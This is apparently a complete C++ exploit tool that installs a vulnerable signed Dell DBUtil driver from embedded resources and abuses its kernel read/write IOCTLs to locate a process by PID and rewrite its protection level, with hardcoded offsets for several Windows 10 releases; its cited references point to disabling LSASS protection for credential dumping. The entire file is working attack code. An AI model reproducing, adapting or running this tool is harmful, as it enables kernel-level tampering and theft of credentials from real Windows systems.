#include <Windows.h>
#include <Psapi.h>
#include <newdev.h>
#include <iostream>
#include <fstream>

#include "resources.h"
#include "popl.hpp"

/**
 * See:
 *  
 *    https://github.com/rapid7/metasploit-framework/pull/15190
 *    https://github.com/RedCursorSecurityConsulting/PPLKiller
 *    https://posts.specterops.io/mimidrv-in-depth-4d273d19e148
 *    https://itm4n.github.io/lsass-runasppl/
 *    https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5
 * 
 */

namespace
{
    const std::string s_driverHandle("\\\\.\\DBUtil_2_5");

    const uint32_t s_write_ioctl = 0x9b0c1ec8;
    const uint32_t s_read_ioctl = 0x9b0c1ec4;

    struct Offsets
    {
        uint64_t UniqueProcessIdOffset;
        uint64_t ActiveProcessLinksOffset;
        uint64_t SignatureLevelOffset;
    };

    uint64_t readPrimitive(HANDLE p_device, uint64_t p_address)
    {
        uint64_t read_data[4] = { 0, p_address, 0, 0 };
        uint64_t response[4] = { };
        DWORD dwBytesReturned = 0;
        DeviceIoControl(p_device, s_read_ioctl, &read_data, sizeof(read_data), &response, sizeof(response), &dwBytesReturned, 0);
        return response[3];
    }

    void writePrimitive(HANDLE p_device, uint64_t p_address, uint64_t p_data)
    {
        uint64_t write_data[4] = { 0, p_address, 0, p_data };
        uint64_t response[4] = { };
        DWORD bytesReturned = 0;
        DeviceIoControl(p_device, s_write_ioctl, &write_data, sizeof(write_data), &response, sizeof(response), &bytesReturned, 0);
    }

    bool getDeviceHandle(HANDLE& p_handle)
    {
        p_handle = CreateFileA(s_driverHandle.c_str(), GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (INVALID_HANDLE_VALUE == p_handle)
        {
            std::cout << "[!] Failed to get a handle to " << s_driverHandle.c_str() << ": " << GetLastError() << std::endl;
            return false;
        }
        return true;
    }

    uint64_t getKernelBaseAddr()
    {
        DWORD out = 0;
        DWORD nb = 0;
        uint64_t return_value = 0;
        if (EnumDeviceDrivers(NULL, 0, &nb))
        {
            PVOID* base = (PVOID*)malloc(nb);
            if (base != NULL && EnumDeviceDrivers(base, nb, &out))
            {
                return_value = (uint64_t)base[0];
            }

            free(base);
            base = NULL;
        }
        return return_value;
    }

    uint64_t getPsInitialSystemProcessAddress(HANDLE p_device)
    {
        const auto NtoskrnlBaseAddress = getKernelBaseAddr();
        std::cout << "[+] Ntoskrnl base address: " << NtoskrnlBaseAddress << std::endl;

        // Locating PsInitialSystemProcess address
        HMODULE Ntoskrnl = LoadLibraryA("ntoskrnl.exe");
        if (Ntoskrnl == NULL)
        {
            return false;
        }

        uint64_t PsInitialSystemProcessOffset = (uint64_t)(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - (uint64_t)(Ntoskrnl);
        FreeLibrary(Ntoskrnl);

        return readPrimitive(p_device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    }

    uint64_t getTargetProcessAddress(HANDLE p_device, Offsets p_offsets, uint64_t p_psInitialSystemProcessAddress, uint64_t p_targetPID)
    {
        // Find our process in active process list
        uint64_t head = p_psInitialSystemProcessAddress + p_offsets.ActiveProcessLinksOffset;
        uint64_t current = head;

        do
        {
            uint64_t processAddress = current - p_offsets.ActiveProcessLinksOffset;
            uint64_t uniqueProcessId = readPrimitive(p_device, processAddress + p_offsets.UniqueProcessIdOffset);
            if (uniqueProcessId == p_targetPID)
            {
                return current - p_offsets.ActiveProcessLinksOffset;
            }
            current = readPrimitive(p_device, processAddress + p_offsets.ActiveProcessLinksOffset);
        } while (current != head);

        // oh no
        return 0;
    }

    bool changeProcessProtection(uint64_t targetPID, Offsets offsets, bool p_protect)
    {
        HANDLE Device = INVALID_HANDLE_VALUE;
        if (!getDeviceHandle(Device))
        {
            return false;
        }
        std::cout << "[+] Device handle has been obtained @ " << s_driverHandle << std::endl;

        uint64_t PsInitialSystemProcessAddress = getPsInitialSystemProcessAddress(Device);
        if (PsInitialSystemProcessAddress == 0)
        {
            std::cout << "[-] Failed to resolve PsInitilaSystemProcess" << std::endl;
            CloseHandle(Device);
            return false;
        }
        std::cout << "[+] PsInitialSystemProcess address: " << PsInitialSystemProcessAddress << std::endl;


        uint64_t targetProcessAddress = getTargetProcessAddress(Device, offsets, PsInitialSystemProcessAddress, targetPID);
        if (targetProcessAddress == 0)
        {
            std::cout << "[-] Failed to find the target process" << std::endl;
            CloseHandle(Device);
            return false;
        }
        std::cout << "[+] Target process address: " << targetProcessAddress << std::endl;

        // read in the current protection bits, mask them out, and write it back
        uint64_t flags = readPrimitive(Device, targetProcessAddress + offsets.SignatureLevelOffset);
        std::cout << "[+] Current SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer bits (plus 5 bytes): " << flags << std::endl;
        flags = (flags & 0xffffffffff000000);

        if (p_protect)
        {
            // wintcb / protected
            flags = (flags | 0x623f3f);
        }

        std::cout << "[+] Writing flags back as: " << flags << std::endl;
        writePrimitive(Device, targetProcessAddress + offsets.SignatureLevelOffset, flags);

        std::cout << "[+] Done!" << std::endl;
        CloseHandle(Device);
        return true;
    }

    bool getVersionOffsets(Offsets& p_offsets)
    {
        char value[255] = { 0x00 };
        DWORD BufferSize = sizeof(value);
        if (ERROR_SUCCESS != RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize))
        {
            std::cerr << "[-] Couldn't determine the Windows release" << std::endl;
            return false;
        }

        std::cout << "[+] Windows version found: " << value << std::endl;
        switch (atoi(value))
        {
        case 1607:
            p_offsets.UniqueProcessIdOffset = 0x02e8;
            p_offsets.ActiveProcessLinksOffset = 0x02f0;
            p_offsets.SignatureLevelOffset = 0x06c8;
            return true;
        case 1803:
        case 1809:
            p_offsets.UniqueProcessIdOffset = 0x02e0;
            p_offsets.ActiveProcessLinksOffset = 0x02e8;
            p_offsets.SignatureLevelOffset = 0x06c8;
            return true;
        case 1903:
        case 1909:
            p_offsets.UniqueProcessIdOffset = 0x02e8;
            p_offsets.ActiveProcessLinksOffset = 0x02f0;
            p_offsets.SignatureLevelOffset = 0x06f8;
            return true;
        case 2004:
        case 2009:
            p_offsets.UniqueProcessIdOffset = 0x0440;
            p_offsets.ActiveProcessLinksOffset = 0x0448;
            p_offsets.SignatureLevelOffset = 0x0878;
            return true;
        default:
            std::cerr << "[-] Unknown offsets for this version. Perhaps add them yourself?" << std::endl;
            break;
        }
        return false;
    }

    void writeResource(int p_id, const char* p_path)
    {
        HRSRC resource_handle = FindResource(NULL, MAKEINTRESOURCE(p_id), RT_RCDATA);
        HGLOBAL loaded = LoadResource(NULL, resource_handle);
        void* data = LockResource(loaded);
        unsigned int size = SizeofResource(NULL, resource_handle);

        std::ofstream file_out(p_path, std::ios::out | std::ios::binary);
        file_out.write((char*)data, size);
        file_out.close();
    }

    void dropDrv27()
    {
        std::cout << "[+] Dropping version 2.7 to disk" << std::endl;
        writeResource(IDR_RT_RCDATA1, "C:\\Windows\\Temp\\DBUtilDrv2.cat");
        writeResource(IDR_RT_RCDATA2, "C:\\Windows\\Temp\\dbutildrv2.inf");
        writeResource(IDR_RT_RCDATA3, "C:\\Windows\\Temp\\DBUtilDrv2.sys");
        writeResource(IDR_RT_RCDATA4, "C:\\Windows\\Temp\\WdfCoInstaller01009.dll");
    }

    void dropDrv25()
    {
        std::cout << "[+] Dropping version 2.5 to disk" << std::endl;
        writeResource(IDR_RT_RCDATA5, "C:\\Windows\\Temp\\DBUtilDrv2.cat");
        writeResource(IDR_RT_RCDATA6, "C:\\Windows\\Temp\\dbutildrv2.inf");
        writeResource(IDR_RT_RCDATA7, "C:\\Windows\\Temp\\DBUtilDrv2.sys");
    }

    bool driver2Setup(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData, char* p_infPath)
    {
        std::cout << "[+] Attempting driver install... " << std::endl;

        GUID guid = {};
        char classname[255] = { };
        if (!SetupDiGetINFClassA(p_infPath, &guid, &(classname[0]), sizeof(classname), NULL))
        {
            std::cout << "[-] SetupDiGetINFClassA failed: " << GetLastError() << std::endl;
            return false;
        }

        p_devInfo = SetupDiCreateDeviceInfoList(&guid, NULL);
        if (INVALID_HANDLE_VALUE == p_devInfo)
        {
            std::cout << "[-] SetupDiCreateDeviceInfoList failed: " << GetLastError() << std::endl;
            return false;
        }

        p_deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
        if (!SetupDiCreateDeviceInfoA(p_devInfo, classname, &guid, NULL, NULL, 1, &p_deviceInfoData))
        {
            std::cout << "[-] SetupDiCreateDeviceInfoList failed: " << GetLastError() << std::endl;
            return false;
        }

        char prop_buff[] = "ROOT\\DBUtilDrv2\x00";
        if (!SetupDiSetDeviceRegistryPropertyA(p_devInfo, &p_deviceInfoData, 1, (BYTE*)&prop_buff[0], sizeof(prop_buff)))
        {
            std::cout << "[-] SetupDiSetDeviceRegistryPropertyA failed: " << GetLastError() << std::endl;
            return false;
        }

        if (!SetupDiCallClassInstaller(0x19, p_devInfo, &p_deviceInfoData))
        {
            std::cout << "[-] SetupDiCallClassInstaller failed: " << GetLastError() << std::endl;
            return false;
        }

        BOOL restart = 0;
        if (!UpdateDriverForPlugAndPlayDevicesA(NULL, prop_buff, p_infPath, INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE, &restart))
        {
            std::cout << "[-] UpdateDriverForPlugAndPlayDevicesA failed: " << GetLastError() << std::endl;
            return false;
        }

        std::cout << "[+] Driver installed! " << std::endl;
        return true;
    }

    void driver2Remove(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData)
    {
        if (p_devInfo != INVALID_HANDLE_VALUE)
        {
            std::cout << "[+] Removing device" << std::endl;
            SetupDiRemoveDevice(p_devInfo, &p_deviceInfoData);
            p_devInfo = INVALID_HANDLE_VALUE;
        }
    }
}

int main(int p_argc, char* p_argv[])
{
    popl::OptionParser op("Allowed options");
    auto help_option = op.add<popl::Switch>("h", "help", "produce help message");
    auto pid_option = op.add<popl::Value<int>, popl::Attribute::required>("p", "pid", "the target pid");
    auto enable_option = op.add<popl::Value<bool>, popl::Attribute::required>("e", "enable", "enable memory protection (0 or 1)");
    auto dversion_option = op.add<popl::Value<bool>, popl::Attribute::required>("d", "driver_version", "Driver version to use (0 = 2.5, 1 = 2.7)");

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    if (help_option->is_set())
    {
        std::cout << op << std::endl;
        return EXIT_SUCCESS;
    }

    std::cout << "[+] User provided pid: " << pid_option->value() << std::endl;

    Offsets offsets = { 0, 0, 0 };
    if (!getVersionOffsets(offsets))
    {
        return EXIT_FAILURE;
    }

    std::cout << "[+] Using offsets: " << std::hex << std::endl;
    std::cout << "\tUniqueProcessIdOffset = 0x" << offsets.UniqueProcessIdOffset << std::endl;
    std::cout << "\tActiveProcessLinkOffset = 0x" << offsets.ActiveProcessLinksOffset << std::endl;
    std::cout << "\tSignatureLevelOffset = 0x" << offsets.SignatureLevelOffset << std::endl;

    if (dversion_option->value())
    {
        dropDrv27();
    }
    else
    {
        dropDrv25();
    }

    HDEVINFO devInfo = NULL;
    SP_DEVINFO_DATA deviceInfoData = { };
    char infPath[] = "C:\\Windows\\Temp\\dbutildrv2.inf\x00";
    if (!driver2Setup(devInfo, deviceInfoData, infPath))
    {
        return EXIT_FAILURE;
    }

    changeProcessProtection(pid_option->value(), offsets, enable_option->value());
    driver2Remove(devInfo, deviceInfoData);

    std::cout << "[!] Clean exit! o7" << std::endl;

    return EXIT_SUCCESS;
}
